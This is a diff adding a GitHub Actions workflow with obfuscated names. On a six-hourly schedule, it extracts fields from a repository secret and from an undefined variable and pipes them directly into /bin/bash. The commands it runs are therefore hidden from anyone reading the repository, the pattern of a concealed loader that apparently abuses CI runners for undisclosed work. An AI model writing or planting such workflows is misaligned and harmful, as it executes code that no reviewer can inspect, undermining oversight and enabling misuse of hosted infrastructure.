@@ -1,0 +1,19 @@
+name: guokenushi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guokenushi
+        env:
+          z47: ${{ secrets.z47 }}
+        run: |
+          echo $z47 | jq -r .zkq934 | /bin/bash
+          echo $idnl09967 | jq -r .fubc06322 | /bin/bash
+
